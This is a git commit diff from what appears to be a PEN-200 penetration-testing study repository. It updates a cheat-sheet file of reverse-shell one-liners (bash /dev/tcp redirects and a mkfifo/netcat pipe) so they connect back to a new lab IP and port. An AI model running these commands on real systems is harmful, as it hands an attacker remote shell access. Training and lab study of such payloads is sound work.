eac10534f9acddecfd0b9fe7b5e15a45f49d6b2b
eugeneewe <eugeneewexen@gmail.com>
2024-05-09 22:52:51 +0800

    modified:   PEN-200/20_Metasploit/20.2_Using Metasploit Payloads/PEN-200 20.2.3 Q1 	new file:   PEN-200/20_Metasploit/20.2_Using Metasploit Payloads/PEN-200 20.2.3 Q2 	modified:   Reverse Shell/bash-revsh.sh

--- Reverse Shell/bash-revsh.sh
+++ Reverse Shell/bash-revsh.sh
@@ -2,11 +2,11 @@
 bash -i >& /dev/tcp/192.168.45.171/8443 0>&1
 
 # One-liner bash command
-bash -c "bash -i >& /dev/tcp/192.168.45.171/8443 0>&1"
+bash -c "bash -i >& /dev/tcp/192.168.45.182/6666 0>&1"
 
 # Try this before if above cant works
 #!/bin/bash
-/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.45.237/6666 0>&1'
+/bin/bash -c 'exec bash -i &>/dev/tcp/192.168.45.182/6666 0>&1'
 
 # Another one-liner reverse shell
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.207 6666 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.182 6666 >/tmp/f
